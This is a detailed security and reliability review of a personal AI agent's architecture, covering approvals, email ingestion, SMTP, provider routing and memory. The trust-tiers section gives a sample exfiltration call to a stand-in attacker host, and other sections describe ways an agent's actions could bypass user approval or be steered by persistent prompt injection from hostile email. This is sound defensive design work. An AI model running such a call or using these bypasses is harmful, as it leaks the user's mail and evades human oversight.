The five-layer structure is a good starting point, but **the design is not yet ready for implementation of autonomous side effects**. Its strongest ideas—central approval enforcement, catch-up execution, and provider isolation—are currently assertions rather than complete contracts.

I reviewed [ARCHITECTURE.md](../../ARCHITECTURE.md) and the referenced Foreman provider implementation. Severity below means: **Critical** can defeat authorization; **High** can cause unintended actions, disclosure, or lost work; **Medium** creates substantial implementation or operational friction.

**1. Five layers and event routing — High: ownership and delivery semantics are missing.**

The boundaries are sensible as modules in one process. The diagram is misleading as a strict pipeline: mail ingestion and schedules originate below the gateway; approvals resume existing work; notifications flow back asynchronously.

Without explicit ownership, both gateway and orchestrator may create runs, retries may create duplicate conversations, and reconnecting a surface may accidentally restart work.

**Change:** Define responsibilities precisely:

- Surfaces authenticate input and translate presentation.
- Gateway maps authenticated identities to conversations and submits commands.
- Orchestrator owns durable runs, scheduling, retries, cancellation, and suspension.
- Runtime proposes tool calls and consumes results.
- Tool executor authorizes and performs effects.

Distinguish **commands** requesting work from **events** recording committed facts. Use versioned envelopes containing an event ID, source deduplication key, principal, conversation/run IDs, causation ID, and timestamp. Persist accepted input and job creation atomically. Deliver notifications through an outbox; streaming is a transient view of durable state.

Keep this a modular monolith. No separate message broker or five independently deployed services is needed.

**2. Trust tiers — Critical: a tool-name registry is necessary but insufficient.**

A registry can reliably gate a narrow `smtp.send` implementation. It cannot infer the effects of a generic browser, HTTP, filesystem, shell, or MCP tool.

Concrete bypasses:

- `fetch("https://attacker.example/?secret=...")` discloses mail while classified as reading.
- “Read mail” changes flags unless implemented with appropriate read semantics.
- A filesystem write changes agent policy or deposits a file in a synced directory.
- Browser navigation or typing triggers an action without a separately named “submit.”
- A broadly privileged MCP server performs more than its advertised tool description implies.

The current tiers also mix different concepts: `draft` is an artifact workflow, `gated` is an authorization requirement, and `session` is a grant lifetime.

**Change:** Keep the labels for UX, but enforce structured capabilities: operation, resource/account, destination, mutation/disclosure class, and authorization requirement. Unknown tools and invalid arguments fail closed. Agent overrides may tighten policy but cannot lower mandatory gates.

Make the executor the only path to effectful credentials. Policy tables must be inaccessible to agent tools. Arbitrary plugins with network access and credentials are trusted code unless separately sandboxed; the registry cannot constrain their internals.

**3. Approval records — Critical: approval must authorize an immutable action.**

“Pending action + preview + verdict” leaves a time-of-check/time-of-use hole. A user can approve one draft and the runtime can send an edited draft, different attachment, or expanded recipient list. Two workers can consume the same approval.

**Change:** Introduce a durable action object before requesting approval. Bind approval to:

- Action ID and tool implementation/version.
- Account and authenticated approving principal.
- Canonical arguments and artifact version/hash.
- Full SMTP envelope, including BCC, body, and attachment hashes.
- Relevant resource preconditions, expiration, and policy version.

Render the preview from this object, not a model-written description. Any meaningful edit invalidates approval. Atomically claim an approved action for execution, recheck current authorization, and persist its outcome separately.

Use explicit states such as `pending → approved → executing → succeeded/failed/unknown`, plus rejection and expiry. A timeout after dispatch is **unknown**, not automatically failed.

For browser actions, immutable arguments alone are insufficient: the page can change. Session grants need bounded targets, allowed operations, duration, and revocation.

**4. Surface authentication — Critical: “resolves via any surface” lacks an identity model.**

Possession of an approval ID must not authorize approval. Neither should any Telegram message containing “yes.” Single-user software still receives input from other people and hostile websites.

**Change:** Establish an installation owner and explicitly paired surface identities in Phase 1. Allowlist Telegram numeric user and private-chat IDs; verify callback sender and pending action binding. Deduplicate update IDs. Never trust a username, forwarded message, or chat membership as owner identity.

For the web UI, require authenticated sessions, CSRF protection, and Origin checks for interactive connections. Bind locally by default; remote access needs an explicit authenticated transport. Surface identity determines who acted; authorization remains in core.

An approval can resolve from another paired surface, but all surfaces must race against the same atomic state transition.

**5. Email choice — High: IMAP is defensible; the app-password rationale is inaccurate.**

The claim that personal Gmail OAuth necessarily requires recurring “CASA Tier 2 ($10k+)” is too categorical. Google documents verification exceptions, including personal use. Assessment obligations depend on the deployment and data flow; sending mail content to a cloud model must be included in that analysis. The cited policy does not establish a universal $10k minimum. [Google restricted-scope verification](https://developers.google.com/identity/protocols/oauth2/production-readiness/restricted-scope-verification).

“App passwords work across Gmail/Outlook/most providers” is also not a sound compatibility promise. Exchange Online’s Basic Auth deprecation prevents app-password use for affected protocols, including IMAP. Microsoft supports OAuth for IMAP/SMTP, including Outlook.com. [Microsoft deprecation guidance](https://learn.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/deprecation-of-basic-authentication-exchange-online), [OAuth protocol support](https://learn.microsoft.com/en-us/exchange/client-developer/legacy-protocols/how-to-authenticate-an-imap-pop-smtp-application-by-using-oauth).

Gmail app passwords require eligible account settings and can be unavailable under Advanced Protection or other configurations; password changes revoke them. [Google app-password guidance](https://support.google.com/accounts/answer/185833?hl=en).

**Change:** Separate transport from authentication. Start with **one tested Gmail account configuration**, allowing app passwords as a scoped v1 choice. Design credentials to support OAuth refresh later without replacing IMAP.

Treat app passwords as powerful bearer secrets; per-agent scoping inside Buddi does not narrow their upstream privileges. Require verified TLS and explicit reconnect/revocation states.

Remove “residential IP reads as human” as a security or deliverability rationale. Running locally also does not mean data stays local when prompts, embeddings, or notifications use cloud services.

**6. Email ingestion — High: UID-only deduplication is incorrect.**

The proposed `(provider, UID)` identity can collide across accounts and folders. IMAP identity includes mailbox and UIDVALIDITY; UIDs alone are not globally stable. [IMAP specification](https://www.rfc-editor.org/rfc/rfc9051.html).

**Change:** Persist `(account_id, mailbox_id, uidvalidity, uid)` with a unique constraint. Handle UIDVALIDITY resets, moves, expunges, and changed flags. Commit ingested records, trigger creation, and cursor advancement in one transaction.

Separate mailbox occurrences from logical messages. `Message-ID` is useful evidence, not a guaranteed unique key. Keep processing versions so messages can be intentionally re-triaged after a policy change.

Also separate message state from drafts and send attempts: one email can have multiple drafts and replies. A single `new/triage/drafted/sent` field cannot represent that lifecycle.

**7. Catch-up scheduling — High: idempotency is not adequately addressed.**

`last_run` cannot distinguish “scheduled,” “started,” “partially completed,” and “successfully finished.” “Idempotent mission” is particularly weak when the mission contains nondeterministic model calls and external effects.

**Change:** Add schedule occurrences, runs, steps, and action attempts as distinct records. Give occurrences a database uniqueness constraint based on mission, schedule revision, and scheduled instant. Event-triggered work needs its own source-event key.

Specify per-mission misfire behavior: replay all, coalesce, latest only, or skip after a deadline. Persist timezone and define DST behavior. Bound backlog processing so a week asleep does not produce a week of obsolete morning briefings or saturate the model budget.

Separate “last occurrence materialized” from “last successful run.” Advance scheduler state transactionally with job insertion. Apply freshness checks to old drafts and approvals before execution.

**8. SMTP execution — High: exactly-once sending cannot be promised.**

Consider: SMTP accepts a message, then Buddi crashes before saving success. A retry may send it twice. Marking success first creates the opposite failure: a crash can lose the send. SMTP explicitly recognizes duplicate delivery risks around timeouts. [SMTP specification](https://www.rfc-editor.org/rfc/rfc5321.html).

**Change:** Use a durable send ledger and stable action identity. Save the exact message before dispatch. On ambiguous completion, mark `unknown` and reconcile where possible; do not blindly retry. A stable `Message-ID` helps investigation but is not a universal deduplication guarantee.

For v1, an unresolved ambiguous send should require user review. State the actual guarantee: durable intent and controlled retries, with explicit uncertainty at non-idempotent external boundaries.

**9. RuntimeProvider — High: silent provider reconciliation violates the security intent.**

A model name is not an authorization to send data to whichever endpoint advertises it. Automatic repair can change data destination, credential usage, cost, and behavior. A transcript note occurs after the important decision.

**Change:** Pin endpoint/provider identity separately from its model identifier. Catalogues validate availability within the selected provider; they never authorize migration. Missing models produce a configuration problem. Fallbacks must be explicitly configured and permitted for the data involved.

Snapshot provider, concrete model, capabilities, and pricing basis per run—including summarization and title-generation calls.

**10. Provider resolution — Medium: preserve the ideas, not Foreman’s harness mechanics.**

The discriminated union is a good choice, but TypeScript cannot make unsafe JSON, database records, redirects, or SDK defaults unrepresentable at runtime.

The inspected Foreman code addresses a specific problem: Claude Code discovers ambient credentials. Buddi’s own HTTP loop can avoid that problem entirely by never discovering ambient login state.

**Change:** Validate provider configuration at runtime and bind credentials to approved endpoint origins. Handle redirects conservatively. Construct clients with explicit credentials; do not mutate shared `process.env` per agent.

Use a result union:

```ts
type Resolution =
  | { ok: true; provider: ResolvedProvider }
  | { ok: false; problem: ProviderProblem };
```

An optional `problem` alongside usable-looking fields invites accidental dispatch. Convert expected configuration failures into typed problems; keep programming defects distinguishable and fail closed. Preflight cannot guarantee future availability, so runtime authentication, timeout, and rate-limit failures still need handling.

**11. Wire formats and budgets — Medium: define a capability contract before gateway machinery.**

Two native adapters are reasonable, but wire compatibility is not behavioral equivalence. Streaming tool arguments, schema subsets, tool-result ordering, multimodal input, continuation state, usage, and cancellation all need explicit semantics.

Chat Completions remains supported, but OpenAI recommends Responses for new projects. Treat Chat Completions as a compatibility choice rather than complete OpenAI feature coverage. [OpenAI migration guidance](https://developers.openai.com/api/docs/guides/migrate-to-responses).

**Change:** Define a provider-neutral turn/event contract and capability matrix. Validate complete tool arguments before dispatch. Preserve opaque provider continuation data without pretending it transfers between providers. Disable provider-executed effectful tools unless they pass through Buddi’s authorization boundary.

Defer translating gateways until a required endpoint needs one. A proxy receiving credentials per request still sees those credentials; avoiding persistent storage does not remove it from the trust boundary.

Keep `priced | unpriced | free`, but impose token, turn, time, and concurrency limits on all runs. Dollar limits require reservations across concurrent requests and allowance for delayed usage reporting; unknown pricing must not silently weaken a user-requested hard spending limit.

**12. Memory — High: the proposed table lacks provenance and authorization semantics.**

`agent_id nullable = shared, content, embedding` makes accidental publication easy and does not distinguish a user preference from an assertion extracted from hostile email. Persistent prompt injection can survive long after the source message leaves the context window.

**Change:** Separate conversation history, run checkpoints, explicit user preferences, and derived memories. Store provenance, source references, timestamps, scope, revision, and expiry. Apply permissions before retrieval and again when using referenced data.

Memory may inform reasoning; it must never create permissions or approvals. Publishing to shared memory should be explicit. Provide correction and deletion that also invalidate derived summaries and embeddings. Record embedding model/version.

For v1, use explicit preferences and source-linked summaries; postpone generalized shared vector memory.

**13. Queue durability and concurrency — High: needed in Phase 1, not Phase 2.**

Even one agent can overlap through Telegram, mail ingestion, retries, and startup recovery. Two runs can draft against the same thread or spend the same approval.

**Change:** Use a durable Postgres queue with atomic claims, leases, bounded retries, backoff, and a failed-job inspection path. Prevent stale workers from committing after lease loss; database fencing does not undo external calls already in flight.

Serialize conversation mutation and relevant mailbox/thread actions. Use optimistic versions for drafts. Suspend runs durably while awaiting approval rather than holding a worker or database transaction open.

Persist tool intent and result so recovery does not rerun completed effects. Add cancellation and a global pause control. Move the recovery foundation into Phase 1 even if cron configuration arrives in Phase 2.

**14. Sleeping-machine availability — High: catch-up cannot recover everything.**

Telegram keeps undelivered bot updates for no more than 24 hours. A laptop asleep for several days can permanently miss commands or approval callbacks. [Telegram Bot API](https://core.telegram.org/bots/api).

**Change:** Explicitly document the offline window. Persist updates before advancing the polling offset. On resume, refresh pending approvals and reconcile durable sources such as the mailbox. Webhook sources need documented retention/retry guarantees or an always-on relay. The latter changes the deployment premise and should be optional.

**15. Secrets, observability, and operations — High: these are placeholders today.**

A `secrets` table is not a vault. A stolen database should not automatically expose mail and model credentials. Conversely, a locked OS keychain after restart can stop unattended work.

**Change:** Specify OS-keychain-backed secret storage or encryption with keys kept outside the database. Define locked-vault behavior, rotation, backup/restore, and log redaction. Inject secrets only into trusted adapters.

Add structured run/step/action IDs, queue age, ingest lag, last successful sync, retry counts, approval age, and provider usage. Store policy decisions and concise explanations; do not depend on model internal reasoning for an audit trail.

Keep sensitive artifacts separate from append-only event metadata so retention and deletion remain possible. Define startup supervision, migrations, backup recovery, and disk-full behavior before relying on the system daily.

**16. Single-user v1 scope — Medium: several abstractions precede demonstrated need.**

The major excesses are per-provider child gateways, live catalogue repair, ambient subscription-login support, generic session approvals, shared vector memory, and supporting both embedded Postgres and Docker immediately.

**Change:** Ship one process, one database installation path, one Telegram owner, one mailbox, narrow built-in email tools, and two explicit API-key provider adapters to prove swappability. Keep the module boundaries and ports; postpone generalized infrastructure.

Also remove “multi-user later is an auth layer, not a rewrite.” Multiple users affect ownership, shared-memory ACLs, credentials, approvals, routing, quotas, and deletion. Add an explicit owner concept now, but make no stronger migration promise.

The top five recommendations, in priority order:

1. **Specify and test the authorization boundary:** immutable action approval, authenticated owner identity, atomic consumption, and no alternate credential-bearing execution path.
2. **Design crash recovery before SMTP:** durable runs/actions/outbox, concurrency control, and an explicit `unknown` outcome for ambiguous sends.
3. **Correct the email ADR and ingestion model:** one verified account configuration, transport/auth separation, UIDVALIDITY-aware identity, and transactional cursors.
4. **Make provider routing explicit and fail closed:** runtime-validated configuration, no silent endpoint changes, explicit credentials, and a small capability-tested port.
5. **Narrow Phase 1 while adding its operational essentials:** defer gateways and generalized memory; include vault behavior, pause/recovery controls, backups, and useful execution diagnostics.
